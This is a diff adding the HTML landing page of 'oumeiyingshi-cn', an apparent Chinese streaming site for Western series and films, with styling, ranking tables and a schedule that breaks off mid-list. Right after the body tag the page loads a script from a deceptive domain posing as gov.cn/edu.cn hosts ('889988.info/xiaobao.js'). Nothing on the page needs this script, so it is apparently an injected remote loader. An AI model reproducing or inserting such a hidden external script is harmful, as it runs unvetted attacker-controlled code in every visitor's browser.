@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>欧美影视 - 美剧英剧欧美电影在线观看 | oumeiyingshi-cn</title>
+<meta name="keywords" content="欧美影视, oumeiyingshi-cn, 美剧在线观看, 英剧在线观看, 欧美电影在线观看, 欧美综艺纪录片">
+<meta name="description" content="欧美影视(oumeiyingshi-cn)专注美剧、英剧、欧美电影在线观看，同步海外更新，高清双语字幕，海量欧美影视资源一站畅看，多端自适应无需下载。">
+<meta name="author" content="欧美影视">
+<meta name="robots" content="index, follow, max-image-preview:large">
+<meta name="theme-color" content="#f4f4f2">
+<meta property="og:type" content="website">
+<meta property="og:title" content="欧美影视 - 美剧英剧欧美电影在线观看">
+<meta property="og:description" content="同步海外更新，高清双语字幕，海量欧美影视资源一站畅看。">
+<meta property="og:url" content="https://oumeiyingshi-cn.github.io/">
+<meta property="og:site_name" content="欧美影视">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="canonical" href="https://oumeiyingshi-cn.github.io/">
+<style>
+:root{
+  --bg:#f4f4f2; --ink:#111111; --ink2:#2a2a2a; --txt:#4a4a48; --txt2:#7a7a76;
+  --line:#deded9; --line2:#c9c9c2; --card:#ffffff; --ac:#d4ff3a; --ac2:#b8e600;
+  --rd:4px; --sh:0 2px 0 #111111;
+  --serif:"Playfair Display","Songti SC","Source Han Serif SC",Georgia,serif;
+  --mono:"SFMono-Regular",Menlo,Consolas,monospace;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;scroll-padding-top:70px}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Hiragino Sans GB","WenQuanYi Micro Hei",system-ui,sans-serif;
+  background:var(--bg);color:var(--txt);line-height:1.75;font-size:16px;overflow-x:hidden;-webkit-font-smoothing:antialiased;
+}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none;transition:.25s}
+ul{list-style:none}
+h1,h2,h3,h4{line-height:1.25;font-weight:800;letter-spacing:.4px;color:var(--ink)}
+.container{max-width:1240px;margin:0 auto;padding:0 24px}
+section{padding:88px 0;scroll-margin-top:70px}
+::selection{background:var(--ac);color:#111}
+
+/* 顶部通告条 */
+.marq{border-bottom:1px solid var(--line);background:#111;color:#fff;font-size:13px;padding:9px 0;overflow:hidden}
+.marq .in{display:flex;gap:48px;white-space:nowrap;animation:mq 40s linear infinite;width:max-content}
+.marq span{color:var(--ac)}
+@keyframes mq{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+
+/* 导航：报纸式大标题 */
+.nb{position:sticky;top:0;z-index:99;background:rgba(244,244,242,.94);backdrop-filter:blur(12px);border-bottom:2px solid #111}
+.nb .top{border-bottom:1px solid var(--line);padding:14px 0}
+.nb .top .in{display:flex;align-items:center;justify-content:space-between;font-family:var(--mono);font-size:12px;color:var(--txt2);letter-spacing:1px}
+.nb .main{display:flex;align-items:center;justify-content:space-between;padding:20px 0}
+.mast{font-family:var(--serif);font-size:clamp(34px,6vw,58px);font-weight:900;letter-spacing:-1px;line-height:1;color:#111;font-style:italic}
+.mast small{display:block;font-family:var(--mono);font-size:11px;letter-spacing:4px;color:var(--txt2);font-style:normal;margin-top:8px;font-weight:400}
+.menu{display:flex;gap:2px;flex-wrap:wrap;justify-content:flex-end}
+.menu a{padding:8px 14px;font-weight:700;font-size:15px;color:var(--ink2);border-radius:var(--rd);font-family:var(--serif);font-style:italic}
+.menu a:hover{background:#111;color:var(--ac)}
+.mb{display:none;width:44px;height:44px;border:2px solid #111;align-items:center;justify-content:center;cursor:pointer;font-size:20px;font-weight:900}
+
+/* Hero：杂志封面式分栏 */
+.hero{background:var(--bg);border-bottom:2px solid #111;padding:56px 0 0}
+.hero .lead{display:grid;grid-template-columns:1.4fr 1fr;gap:40px;align-items:end;padding-bottom:44px;border-bottom:1px solid var(--line)}
+.hero h1{font-family:var(--serif);font-size:clamp(40px,7vw,76px);font-weight:900;line-height:1.05;letter-spacing:-1.5px}
+.hero h1 em{font-style:normal;background:var(--ac);padding:0 6px;box-shadow:var(--sh)}
+.hero .kicker{font-family:var(--mono);font-size:12px;letter-spacing:3px;color:var(--txt2);margin-bottom:18px;display:block}
+.hero .stand{font-size:17px;color:var(--ink2);border-left:3px solid #111;padding-left:18px}
+.hero .meta{margin-top:14px;display:flex;gap:10px;flex-wrap:wrap;font-family:var(--mono);font-size:12px;color:var(--txt2)}
+.hero .meta b{color:#111;background:var(--ac);padding:2px 8px}
+.cover{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border-top:1px solid var(--line)}
+.cover .cv{grid-column:span 2;position:relative;min-height:420px;overflow:hidden;border-right:1px solid var(--line)}
+.cover .cv img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;filter:grayscale(.25)}
+.cover .cv .tag{position:absolute;top:16px;left:16px;background:var(--ac);color:#111;font-family:var(--mono);font-size:11px;font-weight:800;padding:4px 10px;letter-spacing:1px}
+.cover .cv .cap{position:absolute;left:16px;right:16px;bottom:16px;background:#111;color:#fff;padding:14px 18px}
+.cover .cv .cap h3{color:#fff;font-family:var(--serif);font-size:22px;font-style:italic}
+.cover .cv .cap span{font-size:12px;color:#aaa}
+.cover .side{display:flex;flex-direction:column}
+.cover .side a{flex:1;display:flex;gap:14px;align-items:center;padding:18px 18px;border-bottom:1px solid var(--line);transition:.25s;background:#fff}
+.cover .side a:last-child{border:none}
+.cover .side a:hover{background:var(--ac)}
+.cover .side .n{font-family:var(--serif);font-style:italic;font-size:26px;color:var(--txt2);flex:none;width:34px}
+.cover .side .tx h4{font-size:15px;font-family:var(--serif);font-style:italic}
+.cover .side .tx span{font-size:12px;color:var(--txt2)}
+
+/* 栏目一：分类（大数字索引） */
+.cats{background:#fff;border-bottom:2px solid #111}
+.idx{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));border-left:1px solid var(--line);border-top:1px solid var(--line)}
+.idx a{display:flex;flex-direction:column;gap:8px;padding:30px 24px;border-right:1px solid var(--line);border-bottom:1px solid var(--line);position:relative;transition:.3s;overflow:hidden}
+.idx a:hover{background:#111;color:#fff}
+.idx a:hover .num{color:var(--ac)}
+.idx a:hover .ar{right:16px;opacity:1}
+.idx .num{font-family:var(--serif);font-style:italic;font-size:42px;font-weight:900;color:var(--line2);line-height:1;transition:.3s}
+.idx h3{font-size:20px;font-family:var(--serif);font-style:italic}
+.idx p{font-size:13px;color:var(--txt2);transition:.3s}
+.idx a:hover p{color:#aaa}
+.idx .ar{position:absolute;right:8px;bottom:16px;font-size:20px;opacity:0;transition:.3s;color:var(--ac)}
+
+/* 栏目二：热播（大图堆叠滑动） */
+.trend{background:var(--bg);border-bottom:2px solid #111}
+.sec-h{display:flex;align-items:flex-end;justify-content:space-between;gap:20px;flex-wrap:wrap;padding-bottom:22px;border-bottom:2px solid #111;margin-bottom:0}
+.sec-h .lhs{display:flex;align-items:baseline;gap:14px;flex-wrap:wrap}
+.sec-h .no{font-family:var(--mono);font-size:13px;color:var(--txt2);letter-spacing:2px}
+.sec-h h2{font-family:var(--serif);font-size:clamp(26px,4vw,40px);font-style:italic;font-weight:900}
+.sec-h .sub{color:var(--txt2);font-size:14px}
+.sec-h a.more{font-family:var(--mono);font-size:13px;color:#111;border-bottom:2px solid #111;padding-bottom:2px}
+.sec-h a.more:hover{color:var(--ink2);border-color:var(--ac);background:var(--ac)}
+.stk{display:grid;grid-template-columns:1.6fr 1fr;gap:0;border:2px solid #111}
+.stk .feat{position:relative;min-height:520px;overflow:hidden}
+.stk .feat img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;filter:grayscale(.15);transition:.8s}
+.stk .feat:hover img{transform:scale(1.06)}
+.stk .feat .sc{position:absolute;inset:0;background:linear-gradient(180deg,transparent 40%,rgba(0,0,0,.9))}
+.stk .feat .ct{position:absolute;left:28px;right:28px;bottom:26px;color:#fff}
+.stk .feat .ct .ep{font-family:var(--mono);font-size:12px;color:var(--ac);letter-spacing:2px}
+.stk .feat .ct h3{color:#fff;font-family:var(--serif);font-size:32px;font-style:italic;margin:8px 0}
+.stk .feat .ct p{font-size:14px;color:#ccc;max-width:90%}
+.stk .feat .ct .row{display:flex;gap:8px;flex-wrap:wrap;margin-top:14px}
+.stk .feat .ct .row span{font-size:12px;background:rgba(255,255,255,.16);padding:4px 10px}
+.stk .lst{display:flex;flex-direction:column;border-left:2px solid #111;background:#fff}
+.stk .lst a{display:flex;gap:14px;padding:16px 20px;border-bottom:2px solid var(--line);transition:.25s;align-items:flex-start}
+.stk .lst a:last-child{border:none}
+.stk .lst a:hover{background:#111;color:#fff}
+.stk .lst a:hover .n{color:var(--ac)}
+.stk .lst .n{font-family:var(--serif);font-style:italic;font-size:24px;font-weight:900;color:var(--line2);flex:none;width:28px}
+.stk .lst .tx h4{font-size:15px;font-family:var(--serif);font-style:italic}
+.stk .lst .tx span{font-size:12px;color:var(--txt2);display:block;margin-top:3px}
+
+/* 栏目三：字幕（左右交替 + 引号块） */
+.subt{background:#111;color:#e8e8e6;border-bottom:2px solid #111}
+.subt .sec-h{border-color:#333}
+.subt .sec-h .no{color:#777}
+.subt .sec-h h2{color:#fff}
+.subt .sec-h a.more{color:#fff;border-color:#fff}
+.subt .sec-h a.more:hover{color:#111;background:var(--ac);border-color:var(--ac)}
+.alt{display:flex;flex-direction:column;gap:0}
+.alt .row{display:grid;grid-template-columns:1fr 1fr;border-top:1px solid #333}
+.alt .row:first-child{border-top:1px solid #333}
+.alt .row:nth-child(even){direction:rtl}
+.alt .row:nth-child(even) .txt{direction:ltr}
+.alt .pic{position:relative;overflow:hidden;min-height:300px}
+.alt .pic img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;filter:grayscale(.4) contrast(1.05)}
+.alt .txt{padding:44px 40px;display:flex;flex-direction:column;justify-content:center}
+.alt .txt .qt{font-family:var(--serif);font-size:52px;line-height:.6;color:var(--ac)}
+.alt .txt h3{font-family:var(--serif);font-size:26px;font-style:italic;margin:14px 0 10px;color:#fff}
+.alt .txt p{font-size:15px;color:#aaa;margin-bottom:16px}
+.alt .txt .lb{font-family:var(--mono);font-size:12px;letter-spacing:2px;color:var(--ac)}
+
+/* 栏目四：片单（表格化清单） */
+.list{background:var(--bg);border-bottom:2px solid #111}
+.tbl{width:100%;border-collapse:collapse;border:2px solid #111;background:#fff;font-size:15px}
+.tbl th{background:#111;color:#fff;font-family:var(--mono);font-size:12px;letter-spacing:2px;font-weight:700;text-align:left;padding:16px 20px;text-transform:uppercase}
+.tbl td{padding:18px 20px;border-bottom:1px solid var(--line);vertical-align:middle}
+.tbl tr:last-child td{border:none}
+.tbl tbody tr{transition:.25s}
+.tbl tbody tr:hover{background:var(--ac)}
+.tbl .rk{font-family:var(--serif);font-style:italic;font-size:22px;font-weight:900;width:56px}
+.tbl .nm{font-weight:800;font-size:17px;color:var(--ink)}
+.tbl .nm small{display:block;font-size:12px;color:var(--txt2);font-weight:400}
+.tbl .ty{font-family:var(--mono);font-size:12px;color:var(--txt2);white-space:nowrap}
+.tbl .sc{font-weight:800;color:#111;white-space:nowrap}
+.tbl .sc::before{content:"★ ";color:var(--ac);-webkit-text-stroke:1px #111}
+.tbl .go{text-align:right;font-family:var(--mono);font-size:13px;color:#111;font-weight:700;white-space:nowrap}
+.tbl tbody tr:hover .go{text-decoration:underline}
+
+/* 栏目五：时间线（更新日历） */
+.cal{background:#fff;border-bottom:2px solid #111}
+.tl{position:relative;padding:12px 0}
+.tl::before{content:"";position:absolute;left:140px;top:0;bottom:0;width:2px;background:#111}
+.tl .it{display:grid;grid-template-columns:140px 1fr;gap:40px;padding:20px 0;position:relative}
+.tl .it::before{content:"";position:absolute;left:132px;top:32px;width:18px;height:18px;background:var(--ac);border:3px solid #111;border-radius:50%;z-index:2}
+.tl .dt{font-family:var(--mono);font-size:13px;color:var(--txt2);padding-top:4px;text-align:right}
+.tl .dt b{display:block;font-family:var(--serif);font-style:italic;font-size:22px;color:#111}
+.tl .cx{background:var(--bg);border:1px solid var(--line);padding:20px 24px;display:grid;grid-template-columns:auto 1fr auto;gap:20px;align-items:center;border-radius:var(--rd)}
+.tl .cx .fl{font-family:var(--mono);font-size:11px;font-weight:800;background:#111;color:#fff;padding:5px 10px;letter-spacing:1px;height:fit-content}
+.tl .cx .tx h4{font-size:18px;font-family:var(--serif);font-style:italic}
+.tl .cx .tx span{font-size:13px;color:var(--txt2)}
+.tl .cx .ep{font-family:var(--mono);font-size:13px;font-weight:800;color:#111;white-space:nowrap;border-left:1px solid var(--line);padding-left:20px}
+
+/* 栏目六：影评（评论卡片网格） */
+.rvs{background:var(--bg);border-bottom:2px solid #111}
+.rvg{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:24px}
+.rv{background:#fff;border:2px solid #111;padding:28px;position:relative;transition:.3s}
+.rv:hover{transform:translate(-4px,-4px);box-shadow:8px 8px 0 var(--ac)}
+.rv .stars{font-size:14px;color:var(--ac);-webkit-text-stroke:1px #111;letter-spacing:2px;margin-bottom:12px}
+.rv h4{font-family:var(--serif);font-size:22px;font-style:italic;margin-bottom:10px}
+.rv p{font-size:14px;color:var(--txt);margin-bottom:18px}
+.rv .au{display:flex;align-items:center;gap:12px;border-top:1px solid var(--line);padding-top:14px}
+.rv .au .av{width:38px;height:38px;border-radius:50%;background:#111;color:var(--ac);display:flex;align-items:center;justify-content:center;font-family:var(--serif);font-style:italic;font-weight:900;flex:none}
+.rv .au b{font-size:14px}
+.rv .au span{font-size:12px;color:var(--txt2)}
+
+/* 栏目七：数据统计（计数动画 + 横向条） */
+.sta{background:#111;color:#e8e8e6;border-bottom:2px solid #111}
+.sta .sec-h{border-color:#333}
+.sta .sec-h .no{color:#777}
+.sta .sec-h h2{color:#fff}
+.sta .grid{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border:2px solid #333}
+.sta .k{border-right:1px solid #333;border-bottom:1px solid #333;padding:40px 28px}
+.sta .k b{display:block;font-family:var(--serif);font-size:52px;font-weight:900;color:var(--ac);line-height:1;font-style:italic}
+.sta .k span{font-size:14px;color:#aaa;display:block;margin-top:10px}
+.sta .k p{font-size:13px;color:#777;margin-top:12px}
+.sta .hbs{margin-top:40px;display:flex;flex-direction:column;gap:20px}
+.sta .hb{display:grid;grid-template-columns:140px 1fr 70px;gap:20px;align-items:center}
+.sta .hb .lb{font-family:var(--serif);font-style:italic;font-size:18px;color:#fff}
+.sta .hb .tr{height:14px;background:#222;position:relative;overflow:hidden}
+.sta .hb .tr i{position:absolute;left:0;top:0;height:100%;width:0;background:var(--ac)}
+.sta .hb .vl{font-family:var(--mono);font-size:14px;color:var(--ac);text-align:right}
+
+/* 关于 */
+.about{background:var(--bg)}
+.ab{display:grid;grid-template-columns:1fr 1fr;gap:60px;align-items:center}
+.ab .lhs .kicker{font-family:var(--mono);font-size:12px;letter-spacing:3px;color:var(--txt2)}
+.ab h2{font-family:var(--serif);font-size:clamp(28px,4vw,44px);font-style:italic;margin:14px 0 20px;line-height:1.15}
+.ab p{font-size:15px;color:var(--ink2);margin-bottom:14px}
+.ab .chs{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin:24px 0}
+.ab .ch{background:#fff;border:2px solid #111;padding:20px;transition:.25s}
+.ab .ch:hover{background:#111;color:#fff}
+.ab .ch:hover span{color:var(--ac)}
+.ab .ch span{font-family:var(--serif);font-style:italic;font-size:24px;color:var(--txt2);display:block;margin-bottom:6px}
+.ab .ch b{font-size:15px;display:block}
+.ab .rhs{background:#fff;border:2px solid #111;padding:0}
+.ab .rhs .q{display:grid;grid-template-columns:56px 1fr;border-bottom:1px solid var(--line)}
+.ab .rhs .q:last-child{border:none}
+.ab .rhs .q .qn{background:var(--ac);font-family:var(--serif);font-style:italic;font-size:24px;font-weight:900;display:flex;align-items:center;justify-content:center;border-right:1px solid #111}
+.ab .rhs .q .qa{padding:20px 24px}
+.ab .rhs .q .qa h4{font-size:16px;margin-bottom:6px}
+.ab .rhs .q .qa p{font-size:14px;color:var(--txt)}
+.ab .rhs .q .qa a{color:#111;border-bottom:1px solid #111}
+.ab .rhs .q .qa a:hover{background:var(--ac)}
+
+/* 页脚 */
+.ft{background:#111;color:#aaa;padding:70px 0 26px}
+.ft .in{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:40px;padding-bottom:44px;border-bottom:1px solid #333}
+.ft .mast{color:#fff}
+.ft .mast small{color:#666}
+.ft p.d{font-size:14px;color:#888;margin-top:16px;max-width:420px}
+.ft h5{color:#fff;font-family:var(--serif);font-style:italic;font-size:19px;margin-bottom:18px}
+.ft a{display:block;color:#888;font-size:14px;padding:5px 0}
+.ft a:hover{color:var(--ac);padding-left:6px}
+.ft .bot{border-top:1px solid #333;margin-top:26px;padding-top:22px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:14px;font-size:13px;color:#777;font-family:var(--mono);letter-spacing:1px}
+.ft .bot a{display:inline;padding:0;color:#777}
+.ft .bot a:hover{color:#fff;background:none}
+.ft .bot .ll a{margin-left:18px}
+
+@media(max-width:980px){
+  section{padding:60px 0}
+  .menu{flex-direction:column;position:fixed;top:0;left:0;right:0;background:rgba(244,244,242,.99);padding:70px 24px 24px;border-bottom:2px solid #111;max-height:0;overflow:hidden;transition:.35s}
+  .menu.open{max-height:100vh}
+  .menu a{font-size:20px;padding:14px;border-bottom:1px solid var(--line)}
+  .mb{display:flex}
+  .hero .lead{grid-template-columns:1fr;gap:24px}
+  .cover{grid-template-columns:1fr}
+  .cover .cv{grid-column:auto;min-height:340px;border-right:none;border-bottom:1px solid var(--line)}
+  .stk{grid-template-columns:1fr}
+  .stk .lst{border-left:none;border-top:2px solid #111}
+  .alt .row{grid-template-columns:1fr}
+  .alt .row:nth-child(even){direction:ltr}
+  .tl::before{left:14px}
+  .tl .it{grid-template-columns:1fr;gap:12px;padding-left:42px}
+  .tl .it::before{left:4px}
+  .tl .dt{text-align:left}
+  .tl .cx{grid-template-columns:1fr;gap:10px}
+  .tl .cx .ep{border-left:none;padding-left:0;border-top:1px solid var(--line);padding-top:12px}
+  .sta .grid{grid-template-columns:1fr 1fr}
+  .sta .k{border-right:1px solid #333}
+  .ab{grid-template-columns:1fr;gap:36px}
+  .ab .chs{grid-template-columns:1fr}
+  .ft .in{grid-template-columns:1fr 1fr}
+}
+@media(max-width:640px){
+  .container{padding:0 16px}
+  .tbl thead{display:none}
+  .tbl td{display:block;padding:10px 16px;border:none}
+  .tbl tr{display:block;padding:16px;border-bottom:1px solid var(--line)}
+  .tbl .go{text-align:left}
+  .sta .grid{grid-template-columns:1fr}
+  .sta .k{border-right:none}
+  .sta .hb{grid-template-columns:1fr;gap:6px}
+  .sta .hb .vl{text-align:left}
+  .rv{box-shadow:4px 4px 0 var(--ac)}
+  .rv:hover{transform:translate(-2px,-2px)}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<div class="marq"><div class="in">
+  <span>★ 同步海外播出</span> 美剧英剧欧美电影在线观看 <span>★ 双语字幕</span> 高清流畅无需下载 <span>★ 新剧速递</span> 2026 春季档火热更新中 <span>★ 同步海外播出</span> 美剧英剧欧美电影在线观看 <span>★ 双语字幕</span> 高清流畅无需下载 <span>★ 新剧速递</span> 2026 春季档火热更新中</div></div>
+
+<header class="nb">
+  <div class="top"><div class="container in"><span>OUMEIYINGSHI · CN ｜ EST. 2018</span><span>同步海外 · 双语字幕 · 高清流畅</span></div></div>
+  <div class="container main">
+    <a href="#" class="mast">欧美影视<small>OUMEI YINGSHI · 在线观看</small></a>
+    <nav class="menu" id="menu">
+      <a href="#cats">类型索引</a>
+      <a href="#trend">热播剧场</a>
+      <a href="#subt">字幕中心</a>
+      <a href="#list">口碑片单</a>
+      <a href="#cal">更新日历</a>
+      <a href="#rvs">观众影评</a>
+      <a href="#data">平台数据</a>
+      <a href="#about">关于本站</a>
+    </nav>
+    <div class="mb" id="menuBtn" aria-label="菜单">≡</div>
+  </div>
+</header>
+
+<!-- Hero：杂志封面 -->
+<section class="hero" id="top">
+  <div class="container">
+    <div class="lead">
+      <div>
+        <span class="kicker">THE WEEKLY · 2026 春季刊</span>
+        <h1>海外好剧<br>一站<em>畅看</em></h1>
+      </div>
+      <div>
+        <p class="stand">欧美影视（oumeiyingshi-cn）专注美剧、英剧、欧美电影在线观看，同步海外播出进度，提供高清双语字幕，海量资源一站畅看，多端自适应无需下载。</p>
+        <div class="meta"><span>覆盖 <b>12 国</b> 影视内容</span><span>字幕 <b>双语切换</b></span><span>更新 <b>每日同步</b></span></div>
+      </div>
+    </div>
+    <div class="cover">
+      <a href="#" class="cv">
+        <img src="https://images.unsplash.com/photo-1489599849927-2ee91cede3ba?w=900&q=80" alt="本周封面：悬疑美剧推荐">
+        <span class="tag">THIS WEEK COVER</span>
+        <div class="cap"><h3>权力与谎言：本周必看悬疑美剧</h3><span>全 8 集 · 豆瓣 8.7 · 双语字幕</span></div>
+      </a>
+      <div class="side">
+        <a href="#"><span class="n">01</span><span class="tx"><h4>王冠之外：新季英剧前瞻</h4><span>英剧 · 古装历史</span></span></a>
+        <a href="#"><span class="n">02</span><span class="tx"><h4>星际迷途：硬科幻新标杆</h4><span>美剧 · 科幻冒险</span></span></a>
+        <a href="#"><span class="n">03</span><span class="tx"><h4>巴黎午夜：法式浪漫犯罪</h4><span>欧剧 · 犯罪剧情</span></span></a>
+        <a href="#"><span class="n">04</span><span class="tx"><h4>柏林谍影：冷战后动作片</h4><span>电影 · 动作惊悚</span></span></a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目一：类型索引 -->
+<section id="cats" class="cats">
+  <div class="container">
+    <div class="sec-h" style="margin-bottom:32px">
+      <div class="lhs"><span class="no">01 / INDEX</span><h2>类型索引</h2></div>
+      <span class="sub">八大品类 · 海量欧美影视资源</span>
+    </div>
+    <div class="idx">
+      <a href="#"><span class="num">01</span><h3>美剧</h3><p>剧情 · 悬疑 · 科幻 · 喜剧 · 罪案，同步美东播出。</p><span class="ar">→</span></a>
+      <a href="#"><span class="num">02</span><h3>英剧</h3><p>迷你剧 · 古装 · 黑色幽默，短小精悍高口碑。</p><span class="ar">→</span></a>
+      <a href="#"><span class="num">03</span><h3>欧美电影</h3><p>好莱坞大片 · 独立制作 · 艺术院线同步上线。</p><span class="ar">→</span></a>
+      <a href="#"><span class="num">04</span><h3>欧剧专区</h3><p>法剧 · 德剧 · 西剧 · 北欧罪案，冷门佳作。</p><span class="ar">→</span></a>
+      <a href="#"><span class="num">05</span><h3>欧美综艺</h3><p>真人秀 · 脱口秀 · 竞演 · 真人实境。</p><span class="ar">→</span></a>
+      <a href="#"><span class="num">06</span><h3>纪录片</h3><p>BBC · HBO · Netflix 高分自然人文科技纪录片。</p><span class="ar">→</span></a>
+      <a href="#"><span class="num">07</span><h3>动画与动漫</h3><p>成人动画 · 定格动画 · 欧洲艺术短片。</p><span class="ar">→</span></a>
+      <a href="#"><span class="num">08</span><h3>经典怀旧</h3><p>IMDb Top250 与历年艾美金球获奖佳作。</p><span class="ar">→</span></a>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：热播剧场 -->
+<section id="trend" class="trend">
+  <div class="container">
+    <div class="sec-h"><div class="lhs"><span class="no">02 / TRENDING</span><h2>热播剧场</h2></div><a href="#" class="more">完整片单 ›</a></div>
+    <div class="stk" style="margin-top:32px">
+      <a href="#" class="feat">
+        <img src="https://images.unsplash.com/photo-1536440136628-849c177e76a1?w=900&q=80" alt="本周最热美剧">
+        <div class="sc"></div>
+        <div class="ct"><span class="ep">EP.06 · 本周最热</span><h3>暗潮汹涌</h3><p>一场精心策划的金融骗局牵出政商高层秘辛，节奏紧凑反转不断，被誉为本年度最佳悬疑美剧。</p><div class="row"><span>悬疑惊悚</span><span>全 10 集</span><span>更新中</span></div></div>
+      </a>
+      <div class="lst">
+        <a href="#"><span class="n">02</span><span class="tx"><h4>伦敦谜案</h4><span>英剧 · 犯罪剧情 · 更新至 04 集</span></span></a>
+        <a href="#"><span class="n">03</span><span class="tx"><h4>星际征途：新纪元</h4><span>美剧 · 硬科幻 · 全 12 集</span></span></a>
+        <a href="#"><span class="n">04</span><span class="tx"><h4>巴黎咖啡馆</h4><span>法剧 · 都市爱情 · 更新至 06 集</span></span></a>
+        <a href="#"><span class="n">05</span><span class="tx"><h4>柏林之冬</h4><span>德剧 · 历史战争 · 全 06 集</span></span></a>
+        <a href="#"><span class="n">06</span><span class="tx"><h4>硅谷新贵</h4><span>美剧 · 职场喜剧 · 更新至 08 集</span></span></a>
+        <a href="#"><span class="n">07</span><span class="tx"><h4>北欧暗夜</h4><span>瑞典剧 · 犯罪悬疑 · 全 08 集</span></span></a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：字幕中心 -->
+<section id="subt" class="subt">
+  <div class="container">
+    <div class="sec-h"><div class="lhs"><span class="no">03 / SUBTITLES</span><h2>字幕中心</h2></div><span class="sub">双语切换 · 多版本可选</span></div>
+    <div class="alt" style="margin-top:40px">
+      <div class="row">
+        <div class="pic"><img src="https://images.unsplash.com/photo-1485846234645-a62644f84728?w=700&q=80" alt="中文字幕"></div>
+        <div class="txt"><span class="qt">“</span><span class="lb">简体中文</span><h3>精准中文字幕</h3><p>专业字幕组人工校对，贴合语境不生硬，人名地名术语统一，方言俚语配注释，观感更接近母语表达。</p><a href="#" class="more" style="font-family:var(--mono);font-size:13px;color:#fff;border-bottom:2px solid var(--ac);padding-bottom:2px">查看字幕规范 ›</a></div>
+      </div>
+      <div class="row">
+        <div class="pic"><img src="https://images.unsplash.com/photo-1440404653325-ab127d49abc1?w=700&q=80" alt="英文字幕"></div>
+        <div class="txt"><span class="qt">“</span><span class="lb">ENGLISH CC</span><h3>原生英文字幕</h3><p>保留原声发音与英文原版字幕，适合英语学习与听力训练，同步切换无延迟，支持隐藏式字幕开关。</p><a href="#" class="more" style="font-family:var(--mono);font-size:13px;color:#fff;border-bottom:2px solid var(--ac);padding-bottom:2px">英语学习专区 ›</a></div>
+      </div>
+      <div class="row">
+        <div class="pic"><img src="https://images.unsplash.com/photo-1574267432553-4b4628081c31?w=700&q=80" alt="繁体字幕"></div>
+        <div class="txt"><span class="qt">“</span><span class="lb">繁體中文</span><h3>繁体字幕可选</h3><p>提供繁体中文版本，适配港台地区用语习惯，用词与标点规范统一，一键切换不中断播放进度。</p><a href="#" class="more" style="font-family:var(--mono);font-size:13px;color:#fff;border-bottom:2px solid var(--ac);padding-bottom:2px">多语言支持 ›</a></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：口碑片单 -->
+<section id="list" class="list">
+  <div class="container">
+    <div class="sec-h" style="margin-bottom:32px"><div class="lhs"><span class="no">04 / TOP LIST</span><h2>口碑片单</h2></div><a href="#" class="more">完整榜单 ›</a></div>
+    <table class="tbl">
+      <thead><tr><th>排名</th><th>作品名称</th><th>类型</th><th>评分</th><th style="text-align:right">观看</th></tr></thead>
+      <tbody>
+        <tr><td class="rk">01</td><td class="nm">王冠 <small>The Crown</small></td><td class="ty">英剧 · 古装历史</td><td class="sc">9.3</td><td class="go">立即观看 ›</td></tr>
+        <tr><td class="rk">02</td><td class="nm">继承之战 <small>Succession</small></td><td class="ty">美剧 · 家族商战</td><td class="sc">9.1</td><td class="go">立即观看 ›</td></tr>
+        <tr><td class="rk">03</td><td class="nm">瞬息全宇宙 <small>Everything Everywhere</small></td><td class="ty">欧美电影 · 科幻喜剧</td><td class="sc">8.9</td><td class="go">立即观看 ›</td></tr>
+        <tr><td class="rk">04</td><td class="nm">冰海沉船 <small>The Abyss</small></td><td class="ty">电影 · 灾难惊悚</td><td class="sc">8.7</td><td class="go">立即观看 ›</td></tr>
+        <tr><td class="rk">05</td><td class="nm">北欧谜踪 <small>Nordic Trace</small></td><td class="ty">欧剧 · 犯罪悬疑</td><td class="sc">8.6</td><td class="go">立即观看 ›</td></tr>
+        <tr><td class="rk">06</td><td class="nm">巴黎地下 <small>Paris Under</small></td><td class="ty">法剧 · 黑色电影</td><td class="sc">8.4</td><td class="go">立即观看 ›</td></tr>
+        <tr><td class="rk">07</td><td class="nm">硅谷少年 <small>Valley Boys</small></td><td class="ty">美剧 · 科技喜剧</td><td class="sc">8.3</td><td class="go">立即观看 ›</td></tr>
+        <tr><td class="rk">08</td><td class="nm">地球脉动：极地 <small>Planet Polar</small></td><td class="ty">纪录片 · 自然</td><td class="sc">9.5</td><td class="go">立即观看 ›</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<!-- 栏目五：更新日历 -->
+<section id="cal" class="cal">
+  <div class="container">
+    <div class="sec-h" style="margin-bottom:40px"><div class="lhs"><span class="no">05 / SCHEDULE</span><h2>更新日历</h2></div><span class="sub">同步海外播出 · 每日更新</span></div>
+    <div class="tl">
+      <div class="it"><div class="dt"><b>周一</b>MON · 20:00</div><div class="cx"><span class="fl">NEW</span><span class="tx"><h4>暗潮汹涌 EP.06</h4><span>悬疑惊悚 · 美剧 · 中英双语字幕</span></span><span class="ep">第 6 集</span></div></div>
+      <div class="it"><div class="dt"><b>周二</b>TUE · 21:00</div><div class="cx"><span class="fl">NEW</span><span class="tx"><h4>伦敦谜案 EP.04</h4><span>犯罪剧情 · 英剧 · 中英双语字幕</span></span><span class="ep">第 4 集</span></div></div>
